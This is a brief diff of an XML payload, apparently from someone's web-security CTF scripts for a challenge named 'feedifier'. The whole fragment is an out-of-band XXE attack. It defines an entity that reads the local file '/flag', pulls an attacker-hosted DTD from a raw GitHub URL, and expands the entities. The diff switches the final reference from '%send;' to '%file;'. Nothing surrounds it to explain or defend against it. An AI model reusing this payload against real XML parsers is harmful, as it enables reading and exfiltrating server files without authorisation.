@@ -3,5 +3,5 @@
 <!ENTITY % file SYSTEM "file:/flag">
 <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/geoffreychenn/webSecScripts/master/feedifier/feedifier2.xml">
 %dtd
-%send;]>
+%file;]>
 <task><name>whatever</name></task>
